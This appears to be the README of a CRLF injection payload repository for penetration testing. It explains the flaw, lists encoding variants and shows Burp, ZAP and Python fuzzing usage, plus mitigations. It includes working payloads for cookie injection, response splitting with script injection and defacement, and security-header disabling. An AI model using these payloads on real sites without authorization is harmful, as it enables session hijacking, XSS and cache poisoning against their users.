# CRLF Injection Payload List

![License](https://img.shields.io/badge/license-MIT-blue.svg)
![Payloads](https://img.shields.io/badge/payloads-250+-green.svg)
![Maintained](https://img.shields.io/badge/maintained-yes-brightgreen.svg)

A comprehensive collection of CRLF (Carriage Return Line Feed) injection payloads for security testing and penetration testing purposes. This repository contains 250+ carefully crafted payloads that can be used with tools like Burp Suite Intruder, OWASP ZAP, and other security testing frameworks.

## 📋 Table of Contents

- [What is CRLF Injection?](#what-is-crlf-injection)
- [Vulnerability Impact](#vulnerability-impact)
- [Repository Structure](#repository-structure)
- [Payload Categories](#payload-categories)
- [Usage](#usage)
  - [With Burp Suite](#with-burp-suite)
  - [With OWASP ZAP](#with-owasp-zap)
  - [With Custom Scripts](#with-custom-scripts)
- [Payload Examples](#payload-examples)
- [Testing Methodology](#testing-methodology)
- [Mitigation](#mitigation)
- [Contributing](#contributing)
- [Disclaimer](#disclaimer)
- [References](#references)
- [License](#license)

## 🔍 What is CRLF Injection?

CRLF injection is a web application vulnerability that occurs when an attacker is able to inject Carriage Return (`%0d` or `\r`) and Line Feed (`%0a` or `\n`) characters into an HTTP response header. These special characters are used to denote the end of an HTTP header and the beginning of the HTTP body.

By injecting CRLF characters, attackers can:
- Manipulate HTTP response headers
- Perform HTTP Response Splitting attacks
- Inject malicious headers like Set-Cookie
- Bypass security controls
- Conduct XSS (Cross-Site Scripting) attacks
- Perform cache poisoning
- Execute session fixation attacks

## ⚠️ Vulnerability Impact

CRLF injection vulnerabilities can lead to serious security issues:

- **HTTP Response Splitting**: Inject arbitrary HTTP responses
- **Session Fixation**: Set cookies to hijack user sessions
- **Cross-Site Scripting (XSS)**: Inject malicious JavaScript code
- **Cache Poisoning**: Corrupt web cache with malicious content
- **Open Redirect**: Redirect users to malicious websites
- **Security Header Bypass**: Disable XSS protection and other security features
- **Log Injection**: Manipulate server logs for covering tracks

**CVSS Base Score**: Typically ranges from 5.3 (Medium) to 8.1 (High) depending on the exploitability and impact.

## 📁 Repository Structure

```
crlf-injection-payload-list/
│
├── Intruder/
│   └── crlf-injection.txt          # Main payload file (250+ payloads)
│
├── README.md                        # This file
└── LICENSE                          # MIT License
```

## 🎯 Payload Categories

This repository contains various types of CRLF injection payloads organized by technique:

### 1. **Basic CRLF Sequences**
- URL-encoded CRLF: `%0d%0a`
- Raw CRLF: `\r\n`
- Uppercase encoding: `%0D%0A`
- Single CR or LF: `%0d`, `%0a`

### 2. **Double CRLF (Response Splitting)**
- `%0d%0a%0d%0a` - Used to split HTTP response
- Allows injecting complete HTTP body content

### 3. **Header Injection Payloads**
- Set-Cookie injection
- Location header manipulation
- Content-Type manipulation
- Custom header injection (X-Forwarded-For, X-Custom-Header, etc.)

### 4. **Unicode & UTF Encodings**
- `%E5%98%8A%E5%98%8D` - UTF-8 encoded CRLF
- `%C4%8D%C4%8A` - Alternative UTF-8 encoding
- `%u000d%u000a` - Unicode encoding
- `\u000d\u000a` - JavaScript Unicode

### 5. **Double Encoding**
- `%250d%250a` - Double URL encoded
- `%25250d%25250a` - Triple encoded
- `%%0d0d%%0a0a` - Mixed encoding

### 6. **Overlong UTF-8 Encoding**
- `%c0%8d%c0%8a` - 2-byte overlong
- `%e0%80%8d%e0%80%8a` - 3-byte overlong

### 7. **Null Byte Combinations**
- `%00%0d%0a` - Null byte prefix
- `%0d%0a%00` - Null byte suffix
- `%u0000%0d%0a` - Unicode null byte

### 8. **HTTP Response Splitting**
- Complete HTTP response injection
- Status code manipulation
- Content-Length header manipulation

### 9. **XSS Combination Attacks**
- CRLF + XSS payloads
- Script injection via response splitting

### 10. **Security Header Bypass**
- X-XSS-Protection disable
- Content-Security-Policy bypass
- X-Frame-Options manipulation

### 11. **Whitespace & Tab Variations**
- Space prefix: `%0d%0a%20`
- Tab prefix: `%0d%0a%09`
- Multiple whitespace characters

### 12. **Path-based Injection**
- `/%0d%0a` - Path with CRLF
- `../%0d%0a` - Directory traversal + CRLF

### 13. **HTTP/2 and Protocol Variations**
- HTTP/1.0, HTTP/1.1, HTTP/2 response injections

### 14. **Advanced Cookie Attributes**
- HttpOnly, Secure, SameSite attributes
- Domain and Path manipulation
- Expires attribute injection

### 15. **Special Characters Combination**
- CRLF with special chars: `#`, `?`, `&`, `=`, `;`
- Query parameter injection

## 🚀 Usage

### With Burp Suite

1. **Download the payload file**:
   ```bash
   git clone https://github.com/payload-box/crlf-injection-payload-list.git
   ```

2. **Open Burp Suite** and capture a request

3. **Send to Intruder** (Right-click → Send to Intruder)

4. **Configure payload positions**:
   - Mark the parameter you want to test (e.g., URL parameter, header value)
   - Click "Add §" to mark positions

5. **Load payloads**:
   - Go to "Payloads" tab
   - Click "Load" button
   - Select `Intruder/crlf-injection.txt`

6. **Configure payload encoding**:
   - Uncheck "URL-encode these characters" (payloads are pre-encoded)

7. **Start attack** and analyze responses:
   - Look for injected headers in responses
   - Check for Set-Cookie headers
   - Verify Location headers
   - Examine response splitting

### With OWASP ZAP

1. **Import the payload file**:
   - Tools → Options → Fuzzer
   - Add custom fuzzer file
   - Select `Intruder/crlf-injection.txt`

2. **Use in Fuzzer**:
   - Right-click on request → Attack → Fuzz
   - Select injection point
   - Choose the CRLF payload file
   - Start fuzzer

### With Custom Scripts

```python
import requests

# Load payloads
with open('Intruder/crlf-injection.txt', 'r') as f:
    payloads = f.read().splitlines()

# Target URL
target = "https://example.com/redirect?url="

# Test each payload
for payload in payloads:
    url = target + payload
    response = requests.get(url, allow_redirects=False)
    
    # Check for injected headers
    if 'Set-Cookie' in response.headers and 'admin' in response.headers['Set-Cookie']:
        print(f"[+] Vulnerable payload found: {payload}")
        print(f"[+] Injected header: {response.headers['Set-Cookie']}")
```

## 💡 Payload Examples

### Example 1: Basic Cookie Injection
```
Payload: %0d%0aSet-Cookie:admin=true
URL: https://example.com/redirect?url=https://google.com%0d%0aSet-Cookie:admin=true

Response Header:
Location: https://google.com
Set-Cookie: admin=true
```

### Example 2: XSS via Response Splitting
```
Payload: %0d%0a%0d%0a<script>alert(document.cookie)</script>
Result: Injects JavaScript into response body
```

### Example 3: HTTP Response Splitting
```
Payload: %0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>Defaced</h1>
Result: Completely hijacks the HTTP response
```

### Example 4: Security Header Bypass
```
Payload: %0d%0aX-XSS-Protection:0
Result: Disables XSS protection in the browser
```

## 🔬 Testing Methodology

### 1. **Identify Injection Points**
Look for user-controllable input that appears in HTTP headers:
- Redirect URLs (`?redirect=`, `?url=`, `?next=`)
- Custom headers (User-Agent, Referer, etc.)
- Cookie values
- Location headers
- Error messages in headers

### 2. **Test for CRLF Injection**
- Start with basic payloads: `%0d%0a`
- Try different encodings
- Use burp collaborator to detect blind CRLF
- Analyze response headers carefully

### 3. **Exploit Development**
- Inject Set-Cookie headers for session fixation
- Use response splitting for XSS
- Manipulate Location headers for open redirect
- Bypass security controls

### 4. **Verification**
- Use browser developer tools to inspect headers
- Verify cookies are set
- Check if XSS payloads execute
- Test redirect functionality

## 🛡️ Mitigation

### For Developers

1. **Input Validation**
   ```python
   # Python example
   def sanitize_header_value(value):
       # Remove CRLF characters
       return value.replace('\r', '').replace('\n', '')
   ```

2. **Use Framework Functions**
   - Use built-in header functions that automatically escape CRLF
   - Avoid manual header construction

3. **Whitelist Validation**
   - For redirects, use whitelist of allowed domains
   - Validate all user input before using in headers

4. **Content-Type Headers**
   - Always set explicit Content-Type headers
   - Use charset declarations

5. **Security Headers**
   ```
   X-Content-Type-Options: nosniff
   X-Frame-Options: DENY
   Content-Security-Policy: default-src 'self'
   ```

### For Organizations

- **WAF Rules**: Deploy Web Application Firewall with CRLF detection
- **Regular Scanning**: Perform periodic security assessments
- **Code Review**: Review code that handles HTTP headers
- **Security Training**: Educate developers about CRLF injection

## 🤝 Contributing

Contributions are welcome! If you have additional CRLF injection payloads or improvements:

1. Fork the repository
2. Create a new branch (`git checkout -b feature/new-payloads`)
3. Add your payloads to `Intruder/crlf-injection.txt`
4. Update README.md if necessary
5. Commit your changes (`git commit -am 'Add new payloads'`)
6. Push to the branch (`git push origin feature/new-payloads`)
7. Create a Pull Request

### Payload Submission Guidelines

- Ensure payloads are properly formatted
- Test payloads before submission
- Provide description for complex payloads
- Avoid duplicates
- Follow the existing categorization

## ⚖️ Disclaimer

**IMPORTANT**: This repository is for educational and authorized security testing purposes only.

- ⚠️ **Unauthorized testing is illegal** - Only test applications you have explicit permission to test
- 📜 **Know the laws** - Understand the legal implications in your jurisdiction
- 🎓 **Educational purpose** - Use this for learning and improving security
- 🔒 **Responsible disclosure** - Report vulnerabilities through proper channels
- 🚫 **No malicious use** - Do not use these payloads for malicious activities

The authors and contributors are not responsible for any misuse or damage caused by this repository. Users are solely responsible for their actions and must comply with all applicable laws and regulations.

**Use at your own risk. Always obtain proper authorization before testing.**

## 📚 References

### Academic Papers & Articles
- [HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics](https://www.cgisecurity.com/lib/HTTP-Response-Splitting.pdf)
- [CRLF Injection - OWASP](https://owasp.org/www-community/vulnerabilities/CRLF_Injection)

### Security Resources
- [PortSwigger Web Security Academy - HTTP Request Smuggling](https://portswigger.net/web-security/request-smuggling)
- [HackerOne CRLF Reports](https://hackerone.com/reports?search=crlf)
- [CWE-93: Improper Neutralization of CRLF Sequences](https://cwe.mitre.org/data/definitions/93.html)

### Tools
- [Burp Suite](https://portswigger.net/burp)
- [OWASP ZAP](https://www.zaproxy.org/)
- [CRLFuzz - CRLF Scanner](https://github.com/dwisiswant0/crlfuzz)

### Bug Bounty Writeups
- Various bug bounty platforms (HackerOne, Bugcrowd, Synack)
- Security researcher blogs and writeups

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

---

## 📊 Statistics

- **Total Payloads**: 250+
- **Encoding Types**: 15+
- **Attack Vectors**: 20+
- **Last Updated**: 2024

## 🌟 Star History

If you find this repository useful, please consider giving it a star ⭐

## 🔗 Related Projects

- [XSS Payload List](https://github.com/payload-box/xss-payload-list)
- [SQL Injection Payload List](https://github.com/payload-box/sql-injection-payload-list)
- [Command Injection Payload List](https://github.com/payload-box/command-injection-payload-list)

## 📞 Contact

- **Author**: [payload-box](https://github.com/payload-box)
- **Repository**: [crlf-injection-payload-list](https://github.com/payload-box/crlf-injection-payload-list)
- **Issues**: [Report Issues](https://github.com/payload-box/crlf-injection-payload-list/issues)

---

**Happy (Ethical) Hacking! 🔐**

*Remember: With great power comes great responsibility. Use these tools wisely and ethically.*